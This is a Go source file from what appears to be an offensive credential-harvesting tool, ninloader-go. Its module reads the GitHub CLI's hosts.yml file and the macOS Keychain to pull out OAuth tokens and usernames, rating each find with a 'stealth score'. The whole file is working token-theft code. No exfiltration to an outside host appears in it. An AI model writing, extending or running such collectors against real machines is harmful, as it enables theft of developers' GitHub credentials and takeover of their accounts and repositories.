package github

import (
	"fmt"
	"os"
	"regexp"
	"strings"

	"github.com/ninken/ninloader-go/internal/collector"
	"github.com/ninken/ninloader-go/internal/platform"
	"github.com/ninken/ninloader-go/internal/registry"
	"github.com/ninken/ninloader-go/internal/types"
)

func init() {
	registry.Register("github", "gh_cli", func() collector.Collector {
		return &GhCliCollector{BaseCollector: collector.BaseCollector{Svc: "github", Src: "gh_cli"}}
	})
}

// GhCliCollector extracts GitHub CLI tokens from ~/.config/gh/hosts.yml
// and macOS Keychain.
type GhCliCollector struct {
	collector.BaseCollector
}

func (c *GhCliCollector) Service() string      { return c.Svc }
func (c *GhCliCollector) Source() string        { return c.Src }
func (c *GhCliCollector) StealthScore() int     { return 5 }
func (c *GhCliCollector) Platforms() []string   { return nil }

var (
	reHostLine = regexp.MustCompile(`^(\S+):\s*$`)
	reKVLine   = regexp.MustCompile(`^\s+(\w+):\s*(.+)$`)
)

type ghHostEntry struct {
	host string
	data map[string]string
}

// hostsPath returns the path to gh CLI hosts.yml.
func (c *GhCliCollector) hostsPath() string {
	return platform.GhCliDir() + string(os.PathSeparator) + "hosts.yml"
}

// parseHostsYml parses hosts.yml using regex — no YAML dependency.
//
// Format:
//
//	github.com:
//	    user: username
//	    oauth_token: gho_xxxxx
//	    git_protocol: https
func (c *GhCliCollector) parseHostsYml(text string) []ghHostEntry {
	var entries []ghHostEntry
	var currentHost string
	currentData := map[string]string{}

	for _, line := range strings.Split(text, "\n") {
		// Top-level host key (no leading whitespace)
		if m := reHostLine.FindStringSubmatch(line); m != nil {
			if currentHost != "" && len(currentData) > 0 {
				entries = append(entries, ghHostEntry{host: currentHost, data: currentData})
			}
			currentHost = m[1]
			currentData = map[string]string{}
			continue
		}

		// Indented key-value pair
		if m := reKVLine.FindStringSubmatch(line); m != nil && currentHost != "" {
			currentData[m[1]] = strings.TrimSpace(m[2])
		}
	}

	// Flush last entry
	if currentHost != "" && len(currentData) > 0 {
		entries = append(entries, ghHostEntry{host: currentHost, data: currentData})
	}

	return entries
}

func (c *GhCliCollector) Discover() []*types.DiscoveredToken {
	var results []*types.DiscoveredToken

	path := c.hostsPath()
	if _, err := os.Stat(path); err != nil {
		return results
	}

	data, err := os.ReadFile(path)
	if err != nil {
		c.Warn(fmt.Sprintf("Failed to parse %s: %v", path, err))
		return results
	}

	entries := c.parseHostsYml(string(data))
	for _, entry := range entries {
		token := entry.data["oauth_token"]
		user := entry.data["user"]
		if user == "" {
			user = "unknown"
		}

		var details string
		if token != "" {
			if len(token) > 8 {
				details = fmt.Sprintf("token=%s...", token[:8])
			} else {
				details = "token=present"
			}
		} else {
			// Check macOS Keychain
			keychainToken := c.readKeychain(entry.host)
			if keychainToken != "" {
				details = fmt.Sprintf("token in keychain (extractable, %s...)", keychainToken[:8])
			} else {
				details = "token in system keyring (not extractable)"
			}
		}

		results = append(results, &types.DiscoveredToken{
			Service:      c.Svc,
			Source:       c.Src,
			Path:         path,
			AccountHint:  fmt.Sprintf("%s@%s", user, entry.host),
			StealthScore: 5,
			Details:      details,
		})
	}

	return results
}

func (c *GhCliCollector) Collect() []*types.CollectedToken {
	var results []*types.CollectedToken

	path := c.hostsPath()
	if _, err := os.Stat(path); err != nil {
		return results
	}

	data, err := os.ReadFile(path)
	if err != nil {
		c.Warn(fmt.Sprintf("Failed to collect from %s: %v", path, err))
		return results
	}

	entries := c.parseHostsYml(string(data))
	for _, entry := range entries {
		token := entry.data["oauth_token"]
		tokenSource := "yaml"

		// Fall back to macOS Keychain if token not in YAML
		if token == "" {
			token = c.readKeychain(entry.host)
			tokenSource = "keychain"
		}

		if token == "" {
			continue
		}

		user := entry.data["user"]
		if user == "" {
			user = "unknown"
		}
		protocol := entry.data["git_protocol"]
		if protocol == "" {
			protocol = "https"
		}

		tok := types.NewCollectedToken(c.Svc, c.Src, 5)
		tok.Username = user
		tok.AccessToken = types.Secure(token)
		tok.Extra["host"] = entry.host
		tok.Extra["git_protocol"] = protocol
		tok.Extra["token_source"] = tokenSource
		results = append(results, tok)
	}

	return results
}
